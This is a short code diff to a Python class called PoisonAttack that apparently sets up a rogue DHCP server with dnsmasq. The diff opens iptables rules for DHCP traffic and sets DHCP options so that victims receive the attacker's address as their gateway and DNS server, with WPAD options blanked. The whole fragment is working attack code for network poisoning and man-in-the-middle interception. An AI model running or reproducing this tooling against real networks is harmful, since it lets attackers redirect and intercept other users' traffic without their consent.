@@ -108,6 +108,7 @@ class PoisonAttack:
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
+            os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --dport 68 -j ACCEPT") 
             # ======================================================
 
             # Configuración dnsmasq (DHCP sin DNS)
@@ -115,8 +116,10 @@ class PoisonAttack:
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
+                f"dhcp-option=1,255.255.255.0\n"       
                 f"dhcp-option=3,{ip}\n"
                 f"dhcp-option=6,{ip}\n"
+                f"dhcp-option=28,192.168.10.255\n"     
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
                 f"bind-dynamic\n"
@@ -209,6 +212,7 @@ class PoisonAttack:
         os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 67 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D INPUT -i {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
         os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --sport 67 -j ACCEPT 2>/dev/null")
+        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -p udp --dport 68 -j ACCEPT 2>/dev/null")
         os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
         os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
         # Restaurar servicios detenidos
